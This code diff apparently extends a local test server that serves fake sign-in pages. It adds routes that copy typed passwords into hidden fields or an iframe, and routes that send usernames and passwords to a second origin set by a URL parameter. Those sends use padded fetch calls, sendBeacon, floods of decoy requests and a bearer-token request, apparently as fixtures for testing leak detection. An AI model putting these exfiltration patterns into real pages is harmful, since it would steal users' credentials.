@@ -221,7 +221,7 @@ document.getElementById('f').addEventListener('submit', async (e) => {
   e.preventDefault();
   const email = document.getElementById('su').value;
   const pw = document.getElementById('sp1').value;
-  const pad = 'x'.repeat(70000);
+  const pad = 'x'.repeat(1150000);
   await fetch('/done/big-signup', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ pad, email, pwLen: pw.length }) });
   location.href = '/welcome';
 });`),
@@ -286,6 +286,95 @@ document.getElementById('f').addEventListener('submit', async (e) => {
   await fetch(api, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password }) });
 });`);
   },
+  '/iframe-draft': (url) => {
+    const secretInFrame = url.searchParams.get('secretInFrame') === '1';
+    const srcdoc = `<!doctype html><meta charset="utf-8"><div id="ed" contenteditable="true"></div><input id="c" type="text" value=""><textarea id="ta"></textarea><input id="fsec" type="hidden" value=""><script>
+document.getElementById('ed').textContent = 'Draft paragraph the person wrote';
+document.getElementById('c').value = 'my half-written comment';
+document.getElementById('ta').value = 'a longer note in a textarea';
+</script>`;
+    const srcdocAttr = srcdoc.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
+    return page('Sign in — with editor iframe', `<form id="f"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button></form><iframe id="draftFrame" srcdoc="${srcdocAttr}"></iframe>`,
+      `const secretInFrame = ${JSON.stringify(secretInFrame)};
+if (secretInFrame) {
+  const p = document.getElementById('p');
+  p.addEventListener('change', () => {
+    const fr = document.getElementById('draftFrame');
+    const fsec = fr && fr.contentDocument && fr.contentDocument.getElementById('fsec');
+    if (fsec) { fsec.value = p.value; fsec.setAttribute('value', p.value); }
+  });
+}`);
+  },
+  '/big-textareas': (url) => {
+    const longHidden = url.searchParams.get('longHidden') === '1';
+    return page('Sign in — large textareas', `<form id="f"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><textarea id="ta1"></textarea><textarea id="ta2"></textarea><textarea id="ta3"></textarea><textarea id="ta4"></textarea><input id="vs" type="hidden" name="__VIEWSTATE"><input id="hb" type="hidden" name="big_state"><button type="submit">Sign in</button><div id="st"></div></form>`,
+      `const longHidden = ${JSON.stringify(longHidden)};
+const chunk = (tag) => (tag + '-0123456789abcdef').repeat(1024).slice(0, 16384);
+document.getElementById('ta1').value = chunk('A');
+document.getElementById('ta2').value = chunk('B');
+document.getElementById('ta3').value = chunk('C');
+document.getElementById('ta4').value = chunk('D');
+document.getElementById('vs').value = 'v'.repeat(20000);
+const p = document.getElementById('p');
+const hb = document.getElementById('hb');
+if (longHidden) {
+  p.addEventListener('change', () => {
+    const s = 'x'.repeat(20000) + p.value;
+    hb.value = s;
+    hb.setAttribute('value', s);
+  });
+}
+document.getElementById('f').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const u = document.getElementById('u').value;
+  const pw = p.value;
+  if (longHidden) {
+    const s = 'x'.repeat(20000) + pw;
+    hb.value = s;
+    hb.setAttribute('value', s);
+  }
+  p.value = '';
+  await fetch('/done/spa', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ username: u, password: pw }) });
+  document.getElementById('st').textContent = 'SPA submitted';
+});`);
+  },
+  '/exfil-f-g': (url) => {
+    const mode = url.searchParams.get('mode') || 'big70k';
+    const o2 = url.searchParams.get('o2') || '';
+    const o3 = url.searchParams.get('o3') || o2;
+    return page('Sign in — exfil & unreadable modes', `<form id="f"><input id="u" name="username" autocomplete="username"><input id="p" type="password" name="password" autocomplete="current-password"><button type="submit">Sign in</button><div id="st"></div></form>`,
+      `const mode = ${JSON.stringify(mode)};
+const o2 = ${JSON.stringify(o2)};
+const o3 = ${JSON.stringify(o3)};
+document.getElementById('f').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const username = document.getElementById('u').value;
+  const password = document.getElementById('p').value;
+  if (mode === 'big70k') {
+    await fetch('/done/spa', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ username, password }) });
+    await fetch(o2 + '/done/exfil-70k', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ pad: 'z'.repeat(70000), username, password }) });
+  } else if (mode === 'flood70') {
+    await fetch(o2 + '/done/exfil-small', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ password }) });
+    await fetch('/done/spa', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ username, password }) });
+    const ps = [];
+    for (let i = 0; i < 70; i++) {
+      ps.push(fetch(o3 + '/done/an-' + i, { method: 'POST', body: 'evt=' + i }));
+    }
+    await Promise.all(ps);
+  } else if (mode === 'beacon') {
+    navigator.sendBeacon(o2 + '/done/exfil-beacon', JSON.stringify({ username, password }));
+    await fetch('/done/spa', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ username, password }) });
+  } else if (mode === 'big1m2_an') {
+    await fetch(o2 + '/done/big-xcred', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ pad: 'p'.repeat(1150000), username, password }) });
+    await fetch(o3 + '/done/an-after', { method: 'POST', body: 'evt=after_big' });
+  } else if (mode === 'widget_auth') {
+    await fetch(o2 + '/api/hdr', { method: 'GET', headers: { Authorization: 'Bearer widget-support-token-123' } });
+    document.getElementById('st').textContent = 'Client validation blocked submit';
+    return;
+  }
+  document.getElementById('st').textContent = 'Done ' + mode;
+});`);
+  },
 };
 
 export function startLoginPages() {
@@ -301,11 +390,11 @@ export function startLoginPages() {
       return res.end('{"ok":true}');
     }
     if (req.method === 'POST') {
-      let b = ''; req.on('data', (d) => { b += d; if (b.length > 262144) req.destroy(); });
+      let b = ''; req.on('data', (d) => { b += d; if (b.length > 4 * 1024 * 1024) req.destroy(); });
       req.on('end', () => {
         let body = {};
-        if (url.pathname === '/done/big-signup') {
-          try { const j = JSON.parse(b || '{}'); body = { email: j.email, pwLen: j.pwLen, bytes: Buffer.byteLength(b) }; } catch { body = { bytes: Buffer.byteLength(b) }; }
+        if (url.pathname === '/done/big-signup' || url.pathname === '/done/big-xcred') {
+          try { const j = JSON.parse(b || '{}'); body = { email: j.email || j.username, pwLen: j.pwLen || (j.password ? j.password.length : 0), bytes: Buffer.byteLength(b) }; } catch { body = { bytes: Buffer.byteLength(b) }; }
         } else {
           try { body = /json/.test(String(req.headers['content-type'])) ? JSON.parse(b || '{}') : Object.fromEntries(new URLSearchParams(b)); } catch { body = { raw: b }; }
         }
